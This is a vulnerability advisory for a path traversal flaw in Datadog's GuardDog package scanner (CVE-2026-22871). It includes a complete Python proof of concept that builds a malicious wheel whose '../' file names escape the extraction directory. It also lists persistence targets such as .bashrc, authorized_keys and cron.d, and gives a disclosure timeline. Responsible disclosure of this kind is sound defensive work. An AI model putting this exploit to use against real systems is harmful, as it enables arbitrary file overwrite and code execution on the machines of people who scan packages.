# Datadog's GuardDog safe_extract Path Traversal leads to Arbitrary File Overwrite and Remote Code Execution 

## Description

A path traversal vulnerability exists in GuardDog's `safe_extract()` function that allows malicious PyPI packages to write arbitrary files outside the intended extraction directory, leading to Arbitrary File Overwrite and Remote Code Execution on systems running GuardDog.

## Details

*   **Vendor**: Datadog

*   **Product**: GuardDog

*   **Firmware Version**: v2.7.0

*   **Repository's URL**: https://github.com/DataDog/guarddog

*   **Vulnerability Type**: CWE-22 Improper Limitation of a Pathname to a Restricted Directory

*   **CVE ID**: CVE-2026-22871

*   **Reported by**: Charbel


## Technical Breakdown

Looking at `guarddog/utils/archives.py`
```python
elif zipfile.is_zipfile(source_archive):
    with zipfile.ZipFile(source_archive, "r") as zip:
        for file in zip.namelist():
            # Note: zip.extract cleans up any malicious file name
            # such as directory traversal attempts This is not the
            # case of zipfile.extractall
            zip.extract(file, path=os.path.join(target_directory, file))  # ❌ VULNERABLE
```

The comment about zip.extract() fooled me at first :) then I noticed the os.path.join() call.
The vulnerability stems from incorrect usage of Python's zipfile.ZipFile.extract() API:
The path parameter should be the target directory, not a full file path
extract() automatically appends the member name to the path.
By passing os.path.join(target_directory, file), GuardDog causes the filename to be appended twice. This breaks zipfile's built-in path traversal sanitization

## Attack Vector

1. Attacker creates malicious wheel with path traversal filenames
2. Uploads to PyPI or distributes directly
3. Package scan: guarddog pypi scan malicious-pkg
4. GuardDog downloads and extracts the package
5. Malicious files written to arbitrary locations
6. Code execution could be achieved

## PoC

### Creating the malicious wheel

```python
#!/usr/bin/env python3
"""
file: create_path_traversal_wheel.py
Create a malicious wheel package that exploits GuardDog's path traversal vulnerability leading to RCE

This wheel will attempt to write files outside the extraction directory when scanned.
"""

import zipfile
from datetime import datetime


def create_malicious_wheel():
    """
    Creates a malicious wheel that exploits the path traversal vulnerability
    in GuardDog's safe_extract() function
    """

    wheel_name = "path_traversal_exploit-1.0.0-py3-none-any.whl"

    print(f"[*] Creating malicious wheel: {wheel_name}")

    with zipfile.ZipFile(wheel_name, 'w', zipfile.ZIP_DEFLATED) as whl:

        metadata = """Metadata-Version: 2.1
Name: path-traversal-exploit
Version: 1.0.0
Summary: A seemingly innocent package
Author: Attacker
License: MIT
"""
        whl.writestr("path_traversal_exploit-1.0.0.dist-info/METADATA", metadata)

        whl.writestr("path_traversal_exploit-1.0.0.dist-info/WHEEL", """Wheel-Version: 1.0
Generator: custom
Root-Is-Purelib: true
Tag: py3-none-any
""")

        whl.writestr("path_traversal_exploit-1.0.0.dist-info/RECORD", "")

        normal_init = """# Innocent looking package
__version__ = "1.0.0"

def hello():
    return "Hello World"
"""
        whl.writestr("path_traversal_exploit/__init__.py", normal_init)

        # PATH TRAVERSAL PAYLOADS
        # These will escape the extraction directory (at /tmp/tmpXXXXXXXXX) when GuardDog scans the package

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Payload 1: Write to /tmp/guarddog_escape.txt
        payload1 = f"""# GUARDDOG PATH TRAVERSAL VULNERABILITY EXPLOITED
# Timestamp: {timestamp}
# This file was written by a malicious wheel package during GuardDog scanning
#
# Impact: Arbitrary file write outside extraction directory
# Severity: HIGH
#
# Depending on how guarddog is running and under which environment, the attacker could have written to:
# - /home/user/.bashrc (code execution on next shell)
# - /home/user/.ssh/authorized_keys (SSH access)
# - /etc/cron.d/malicious (scheduled execution)
# - Any location writable by the user running guarddog

import os
os.system("echo 'Malicious code executed!' > /tmp/backdoor_proof.txt")
"""

        # This filename will traverse UP from the extraction directory to /tmp
        whl.writestr("../../../../tmp/guarddog_escape.txt", payload1)

        # Payload 2: Attempt to write outside /tmp entirely (might fail due to permissions)
        # Payload 2: Attempt to write outside /tmp entirely (will likely fail due to permissions)
        payload2 = f"""# Attempting to write to /var/tmp
# Timestamp: {timestamp}
"""
        whl.writestr("../../../../../var/tmp/guarddog_var_tmp.txt", payload2)

    print(f"[+] Created: {wheel_name}")
    print(f"\n[*] Expected file locations when scanned by GuardDog:")
    print(f"    - /tmp/guarddog_escape.txt")
    print(f"    - /var/tmp/guarddog_var_tmp.txt")
    print(f"\n[!] If GuardDog is vulnerable, these files will be written OUTSIDE the /tmp/tmpXXXXXXX directory created by guarddog.")

    return wheel_name


if __name__ == "__main__":
    print("="*70)
    print("GuardDog Path Traversal Exploit - Malicious Wheel Creator")
    print("="*70)
    print()

    create_malicious_wheel()

    print("\n[*] Done!")
```

Run the script to create the wheel
```
python3 create_path_traversal_wheel.py
```

This creates path_traversal_exploit-1.0.0-py3-none-any.whl containing 2 payloads:
* ../../../../tmp/guarddog_escape.txt
* ../../../../../var/tmp/guarddog_var_tmp.txt

### Testing the vulnerability
```
# Scan the malicious wheel with GuardDog
guarddog pypi scan path_traversal_exploit-1.0.0-py3-none-any.whl

# View the malicious payload written outside of the extraction directory created by guarddog.
cat /tmp/guarddog_escape.txt/tmp/guarddog_escape.txt
```

## Impact

Impact depends on how GuardDog is running and under which environment.

### Possible Scenarios
1. Immediate Code Execution
    * Write to ~/.bashrc → executes on next shell
    * Write to ~/.profile → executes on login 
2. Persistent Backdoors
    * Write to ~/.ssh/authorized_keys → SSH access
    * Write to /etc/cron.d/malicious → scheduled execution (if root)
    * Write to systemd user services → persistent execution

# Timeline
* 2026-01-05: discovered
* 2026-01-05: Reported
* 2026-01-07 Verified by Datadog's team
* 2026-01-11 Patched version released
* 2026-01-13 Advisory published and CVE ID assigned

